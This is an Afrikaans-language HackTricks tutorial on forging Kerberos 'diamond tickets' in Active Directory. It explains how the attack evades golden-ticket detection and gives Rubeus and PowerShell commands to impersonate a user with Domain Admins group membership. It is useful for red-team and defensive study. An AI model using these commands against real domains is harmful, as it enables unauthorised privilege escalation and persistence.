# Diamantkaart

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

## Diamantkaart

**Soos 'n goue kaartjie**, is 'n diamantkaart 'n TGT wat gebruik kan word om **toegang te verkry tot enige diens as enige gebruiker**. 'n Goue kaartjie word heeltemal afgeskerm vervals, versleutel met die krbtgt-hashing van daardie domein, en dan in 'n aanmeldsessie ingevoer vir gebruik. Omdat domeinbeheerders nie TGT's wat hulle regmatig uitgereik het, volg nie, sal hulle graag TGT's aanvaar wat versleutel is met hul eie krbtgt-hashing.

Daar is twee algemene tegnieke om die gebruik van goue kaartjies op te spoor:

* Soek na TGS-REQ's wat geen ooreenstemmende AS-REQ het nie.
* Soek na TGT's met belaglike waardes, soos Mimikatz se verstek 10-jaar leeftyd.

'n **Diamantkaart** word gemaak deur die velde van 'n regmatige TGT wat deur 'n domeinbeheerder uitgereik is, te **verander**. Dit word bereik deur 'n TGT aan te vra, dit te **ontsleutel** met die domein se krbtgt-hashing, die gewenste velde van die kaart te **verander**, en dit dan weer te **versleutel**. Dit **oorwin die twee genoemde tekortkominge** van 'n goue kaartjie omdat:

* TGS-REQ's sal 'n voorafgaande AS-REQ hê.
* Die TGT is uitgereik deur 'n domeinbeheerder, wat beteken dat dit al die korrekte besonderhede van die domein se Kerberos-beleid sal hê. Alhoewel hierdie korrek vervals kan word in 'n goue kaartjie, is dit meer ingewikkeld en vatbaar vir foute.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
